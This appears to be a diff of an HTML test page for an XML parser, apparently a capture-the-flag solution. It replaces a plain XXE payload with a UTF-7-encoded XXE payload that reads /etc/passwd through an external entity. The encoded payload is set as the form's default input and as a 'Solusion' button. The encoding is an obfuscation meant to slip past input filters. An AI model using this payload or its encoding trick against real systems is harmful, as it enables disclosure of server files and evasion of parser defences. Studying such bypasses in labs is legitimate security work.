@@ -7,41 +7,29 @@
     <h2>XML Test Input</h2>
     <form action="xml_parser.php" method="post">
         <textarea name="data" rows="10" cols="50">
-<?xml version="1.0"?>
-<root>
-    <data>
-        <title>Sample Title</title>
-        <desc>Sample Description</desc>
-    </data>
-</root>
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-post+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-title+AD4-+ACY-xxe+ADs-+ADw-/title+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-desc+AD4-xyz+ADw-/desc+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-/post+AD4-+AAo-+ADw-/data+AD4-
+            
         </textarea><br>
         <input type="submit" value="Parse XML">
     </form>
     
     <h3>Test Payloads</h3>
     <button onclick="loadPayload('valid')">Valid XML</button>
-    <button onclick="loadPayload('xxe')">XXE Attack</button>
-
+    <button onclick="loadPayload('sol')">Solusion</button>
     <script>
     function loadPayload(type) {
         const payloads = {
+            sol: `<?xml version="1.0" encoding="UTF-7"?>
++ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-post+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-title+AD4-+ACY-xxe+ADs-+ADw-/title+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-desc+AD4-xyz+ADw-/desc+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-/post+AD4-+AAo-+ADw-/data+AD4-`
+,
             valid: `<?xml version="1.0"?>
 <root>
     <data>
         <title>Safe Content</title>
         <desc>Normal payload</desc>
     </data>
-</root>`,
-
-            xxe: `<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>
-    <data>
-        <title>&xxe;</title>
-        <desc>Malicious payload</desc>
-    </data>
-</root>`
-        };
+</root>`        };
         
         document.querySelector('textarea').value = payloads[type];
     }
